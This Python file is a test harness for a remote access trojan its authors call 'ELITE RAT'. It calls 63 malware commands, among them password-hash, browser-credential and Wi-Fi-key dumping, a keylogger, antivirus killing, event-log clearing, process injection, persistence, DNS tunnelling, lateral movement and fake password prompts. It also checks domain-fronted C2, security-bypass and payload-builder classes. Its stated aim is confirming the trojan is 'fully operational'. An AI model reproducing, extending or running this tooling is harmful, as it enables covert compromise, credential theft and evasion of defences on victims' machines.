#!/usr/bin/env python3
"""
Elite Integration Test Suite
Comprehensive testing of all 63 elite commands and integration
"""

import sys
import os
import importlib
import json
import datetime
import traceback

# Add Core to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'Core'))

def test_elite_commands():
    """Test all 63 elite commands for basic functionality"""
    print("🧪 TESTING ALL 63 ELITE COMMANDS")
    print("=" * 50)
    
    try:
        # Import elite commands
        from Core.elite_commands import *
        
        # List of all 63 elite commands
        elite_commands = [
            # Tier 1 - Core Commands (6)
            ('elite_ls', lambda: elite_ls()),
            ('elite_download', lambda: elite_download('test.txt')),
            ('elite_upload', lambda: elite_upload('test.txt')),
            ('elite_shell', lambda: elite_shell('echo test')),
            ('elite_ps', lambda: elite_ps()),
            ('elite_kill', lambda: elite_kill(1234)),
            
            # Filesystem Commands (9)
            ('elite_cd', lambda: elite_cd('C:\\')),
            ('elite_pwd', lambda: elite_pwd()),
            ('elite_cat', lambda: elite_cat('test.txt')),
            ('elite_rm', lambda: elite_rm('test.txt')),
            ('elite_mkdir', lambda: elite_mkdir('testdir')),
            ('elite_cp', lambda: elite_cp('src.txt', 'dst.txt')),
            ('elite_mv', lambda: elite_mv('old.txt', 'new.txt')),
            ('elite_rmdir', lambda: elite_rmdir('testdir')),
            ('elite_touch', lambda: elite_touch('newfile.txt')),
            
            # System Information Commands (13)
            ('elite_systeminfo', lambda: elite_systeminfo()),
            ('elite_whoami', lambda: elite_whoami()),
            ('elite_hostname', lambda: elite_hostname()),
            ('elite_network', lambda: elite_network()),
            ('elite_processes', lambda: elite_processes()),
            ('elite_privileges', lambda: elite_privileges()),
            ('elite_username', lambda: elite_username()),
            ('elite_installedsoftware', lambda: elite_installedsoftware()),
            ('elite_environment', lambda: elite_environment()),
            ('elite_drives', lambda: elite_drives()),
            ('elite_location', lambda: elite_location()),
            ('elite_lsmod', lambda: elite_lsmod()),
            ('elite_fileinfo', lambda: elite_fileinfo('test.txt')),
            
            # Credential & Data Commands (5)
            ('elite_hashdump', lambda: elite_hashdump()),
            ('elite_chromedump', lambda: elite_chromedump()),
            ('elite_wifikeys', lambda: elite_wifikeys()),
            ('elite_screenshot', lambda: elite_screenshot()),
            ('elite_keylogger', lambda: elite_keylogger('status')),
            
            # Advanced Stealth Commands (9)
            ('elite_hidefile', lambda: elite_hidefile('test.txt')),
            ('elite_hideprocess', lambda: elite_hideprocess(1234)),
            ('elite_clearlogs', lambda: elite_clearlogs()),
            ('elite_firewall', lambda: elite_firewall('status')),
            ('elite_escalate', lambda: elite_escalate()),
            ('elite_clearev', lambda: elite_clearev()),
            ('elite_avkill', lambda: elite_avkill()),
            ('elite_avscan', lambda: elite_avscan()),
            ('elite_scanreg', lambda: elite_scanreg('security')),
            
            # Advanced Features (5)
            ('elite_inject', lambda: elite_inject(1234, 'test.dll')),
            ('elite_migrate', lambda: elite_migrate(1234, 5678)),
            ('elite_vmscan', lambda: elite_vmscan()),
            ('elite_port_forward', lambda: elite_port_forward(8080, 'localhost', 80)),
            ('elite_persistence', lambda: elite_persistence('registry')),
            
            # Network & Social Engineering (6)
            ('elite_hostsfile', lambda: elite_hostsfile('read')),
            ('elite_askpassword', lambda: elite_askpassword('dialog')),
            ('elite_crackpassword', lambda: elite_crackpassword('5d41402abc4b2a76b9719d911017c592')),
            ('elite_dns_tunnel', lambda: elite_dns_tunnel('test', 'example.com')),
            ('elite_lateral', lambda: elite_lateral('scan_network')),
            ('elite_ssh', lambda: elite_ssh('scan', target_range='192.168.1.0/24')),
            
            # System Control & Manipulation (5)
            ('elite_freeze', lambda: elite_freeze('cpu', 1)),  # 1 second test
            ('elite_popup', lambda: elite_popup('messagebox', 'Test', 'Test message')),
            ('elite_lockscreen', lambda: elite_lockscreen('check')),
            ('elite_logintext', lambda: elite_logintext('get')),
            ('elite_sudo', lambda: elite_sudo('whoami', 'check_privileges')),
            
            # Persistence Mechanisms (1)
            ('elite_persist', lambda: elite_persist('list'))
        ]
        
        test_results = {
            'total_commands': len(elite_commands),
            'successful': 0,
            'failed': 0,
            'results': []
        }
        
        for cmd_name, cmd_func in elite_commands:
            try:
                print(f"Testing {cmd_name}...", end=' ')
                result = cmd_func()
                
                if isinstance(result, dict):
                    success = result.get('success', True)
                    if success or 'error' not in result:
                        print("✅ PASS")
                        test_results['successful'] += 1
                        test_results['results'].append({
                            'command': cmd_name,
                            'status': 'PASS',
                            'result': 'Function executed successfully'
                        })
                    else:
                        print(f"⚠️ PARTIAL ({result.get('error', 'Unknown error')})")
                        test_results['failed'] += 1
                        test_results['results'].append({
                            'command': cmd_name,
                            'status': 'PARTIAL',
                            'error': result.get('error', 'Unknown error')
                        })
                else:
                    print("✅ PASS")
                    test_results['successful'] += 1
                    test_results['results'].append({
                        'command': cmd_name,
                        'status': 'PASS',
                        'result': 'Function executed successfully'
                    })
                    
            except ImportError as e:
                print(f"❌ IMPORT ERROR: {str(e)}")
                test_results['failed'] += 1
                test_results['results'].append({
                    'command': cmd_name,
                    'status': 'IMPORT_ERROR',
                    'error': str(e)
                })
            except Exception as e:
                print(f"❌ ERROR: {str(e)}")
                test_results['failed'] += 1
                test_results['results'].append({
                    'command': cmd_name,
                    'status': 'ERROR',
                    'error': str(e)
                })
        
        # Print summary
        print("\n" + "=" * 50)
        print("🧪 ELITE COMMANDS TEST SUMMARY")
        print("=" * 50)
        print(f"Total Commands: {test_results['total_commands']}")
        print(f"✅ Successful: {test_results['successful']}")
        print(f"❌ Failed: {test_results['failed']}")
        print(f"📊 Success Rate: {(test_results['successful'] / test_results['total_commands'] * 100):.1f}%")
        
        # Show failed commands
        if test_results['failed'] > 0:
            print(f"\n❌ FAILED COMMANDS ({test_results['failed']}):")
            for result in test_results['results']:
                if result['status'] in ['ERROR', 'IMPORT_ERROR', 'PARTIAL']:
                    print(f"  - {result['command']}: {result.get('error', 'Unknown error')}")
        
        return test_results
        
    except ImportError as e:
        print(f"❌ CRITICAL: Cannot import elite commands: {str(e)}")
        return {'error': str(e)}
    except Exception as e:
        print(f"❌ CRITICAL: Test suite failed: {str(e)}")
        return {'error': str(e)}

def test_core_components():
    """Test core components"""
    print("\n🔧 TESTING CORE COMPONENTS")
    print("=" * 50)
    
    components = [
        ('Core.elite_connection', 'EliteDomainFrontedC2'),
        ('Core.elite_executor', 'EliteCommandExecutor'),
        ('Core.security_bypass', 'SecurityBypass'),
        ('Core.result_formatters', 'ResultFormatter'),
        ('Core.direct_syscalls', 'DirectSyscalls'),
        ('Core.elite_payload_builder', 'ElitePayloadBuilder')
    ]
    
    component_results = {
        'total': len(components),
        'successful': 0,
        'failed': 0,
        'results': []
    }
    
    for module_name, class_name in components:
        try:
            print(f"Testing {module_name}.{class_name}...", end=' ')
            
            # Import module
            module = importlib.import_module(module_name)
            
            # Get class
            cls = getattr(module, class_name)
            
            # Try to instantiate
            instance = cls()
            
            print("✅ PASS")
            component_results['successful'] += 1
            component_results['results'].append({
                'component': f"{module_name}.{class_name}",
                'status': 'PASS'
            })
            
        except ImportError as e:
            print(f"❌ IMPORT ERROR: {str(e)}")
            component_results['failed'] += 1
            component_results['results'].append({
                'component': f"{module_name}.{class_name}",
                'status': 'IMPORT_ERROR',
                'error': str(e)
            })
        except AttributeError as e:
            print(f"❌ CLASS NOT FOUND: {str(e)}")
            component_results['failed'] += 1
            component_results['results'].append({
                'component': f"{module_name}.{class_name}",
                'status': 'CLASS_NOT_FOUND',
                'error': str(e)
            })
        except Exception as e:
            print(f"❌ ERROR: {str(e)}")
            component_results['failed'] += 1
            component_results['results'].append({
                'component': f"{module_name}.{class_name}",
                'status': 'ERROR',
                'error': str(e)
            })
    
    print(f"\n📊 Core Components: {component_results['successful']}/{component_results['total']} working")
    return component_results

def test_imports():
    """Test all imports are working"""
    print("\n📦 TESTING IMPORTS")
    print("=" * 50)
    
    import_tests = [
        'Core.elite_commands',
        'Core.elite_connection',
        'Core.elite_executor', 
        'Core.security_bypass',
        'Core.result_formatters',
        'Core.direct_syscalls',
        'Core.elite_payload_builder'
    ]
    
    import_results = {
        'total': len(import_tests),
        'successful': 0,
        'failed': 0
    }
    
    for module_name in import_tests:
        try:
            print(f"Importing {module_name}...", end=' ')
            importlib.import_module(module_name)
            print("✅ PASS")
            import_results['successful'] += 1
        except Exception as e:
            print(f"❌ FAIL: {str(e)}")
            import_results['failed'] += 1
    
    print(f"\n📊 Imports: {import_results['successful']}/{import_results['total']} working")
    return import_results

def generate_test_report():
    """Generate comprehensive test report"""
    print("\n" + "🧪 COMPREHENSIVE ELITE RAT TEST SUITE" + "\n")
    print("=" * 60)
    
    # Test imports
    import_results = test_imports()
    
    # Test core components  
    component_results = test_core_components()
    
    # Test elite commands
    command_results = test_elite_commands()
    
    # Generate summary report
    total_tests = (import_results['total'] + 
                   component_results['total'] + 
                   command_results['total_commands'])
    
    total_successful = (import_results['successful'] + 
                       component_results['successful'] + 
                       command_results['successful'])
    
    total_failed = (import_results['failed'] + 
                   component_results['failed'] + 
                   command_results['failed'])
    
    print("\n" + "🎯 FINAL TEST SUMMARY" + "\n")
    print("=" * 60)
    print(f"📊 Total Tests: {total_tests}")
    print(f"✅ Successful: {total_successful}")
    print(f"❌ Failed: {total_failed}")
    print(f"📈 Overall Success Rate: {(total_successful / total_tests * 100):.1f}%")
    
    # Determine overall status
    if total_failed == 0:
        status = "🎉 ALL TESTS PASSED - ELITE RAT FULLY OPERATIONAL!"
    elif total_successful >= total_tests * 0.9:
        status = "✅ MOSTLY OPERATIONAL - Minor issues to resolve"
    elif total_successful >= total_tests * 0.7:
        status = "⚠️ PARTIALLY OPERATIONAL - Significant issues present"
    else:
        status = "❌ CRITICAL ISSUES - Major problems need resolution"
    
    print(f"\n{status}")
    
    # Save detailed report
    report = {
        'test_timestamp': datetime.datetime.now().isoformat(),
        'summary': {
            'total_tests': total_tests,
            'successful': total_successful,
            'failed': total_failed,
            'success_rate': (total_successful / total_tests * 100)
        },
        'import_results': import_results,
        'component_results': component_results,
        'command_results': command_results,
        'status': status
    }
    
    with open('elite_test_report.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n📄 Detailed report saved to: elite_test_report.json")
    
    return report

if __name__ == "__main__":
    try:
        report = generate_test_report()
        
        # Exit with appropriate code
        if report['summary']['failed'] == 0:
            sys.exit(0)  # All tests passed
        else:
            sys.exit(1)  # Some tests failed
            
    except Exception as e:
        print(f"❌ CRITICAL: Test suite crashed: {str(e)}")
        traceback.print_exc()
        sys.exit(2)  # Test suite failure